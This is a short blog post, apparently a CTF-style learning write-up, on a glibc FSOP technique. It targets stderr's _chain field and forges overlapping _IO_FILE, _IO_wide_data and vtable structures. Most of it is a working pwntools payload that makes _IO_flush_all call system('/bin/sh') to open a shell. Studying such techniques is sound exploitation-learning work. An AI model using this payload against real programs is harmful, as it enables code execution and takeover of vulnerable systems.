---
date: '2026-02-25T23:41:04+05:30'
title: 'Fsop 4 Noobz - 1'
---

"  `_wide_data` my beloved...  "

<!--more-->

This FSOP attack targets the `_chain` field of a stdio FILE structre.

It has the following requirements:

1. Libc leak
2. 0xF0 sized writable location
3. Address of where you are writing to

Feel free to read the [exploit](#exploit) along with the cradle that I used to learn this: [fsop-4-noobz-1.zip](images/fsop-4-noobz-1.zip).

## Optimisation

This attack arranges the fields in such a way that the three necessary structs (`struct _IO_FILE`, `struct _IO_wide_data`, `struct _IO_jumps_t`) overlap while also meeting necessary constraints.


## Exploit {#exploit}

Write the address of writable buffer to `stderr->_chain`, and trigger
`_IO_flush_all`.

Write the below to the buffer:

```py
fp_at = hbase + 0x400
# fmt: off
fp = {
    # _IO_FILE
    # -----------------------------

    0: b"a;/bin/sh\x00", # fp->_flags & _IO_NO_WRITE check in _IO_wdoallocbuf
    192: p32(10),   # mode, fp->_mode > 0
    130: p8(0),     # _vtable_offset, _IO_vtable_offset (fp) == 0
    136: libc.sym["_IO_stdfile_0_lock"],
    160: fp_at,     # _wide_data
    216: libc.sym["_IO_wfile_jumps"],  # <-- ADD THIS

    # _IO_wide_data
    # -----------------------------

    # fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
    24: 0,      # _IO_write_base
    32: 8,      # _IO_write_ptr
    48: 0,      # _IO_buf_base, fp->_wide_data->_IO_buf_base
    224: fp_at, # _wide_vtable

    # _IO_wide_data->_wide_vtable
    # -----------------------------

    104: libc.sym["system"], # __doalloc
}
# fmt: on

fp = flat(fp, length=0xF0, filler="\x00")

bp()
io.send(fp)

```

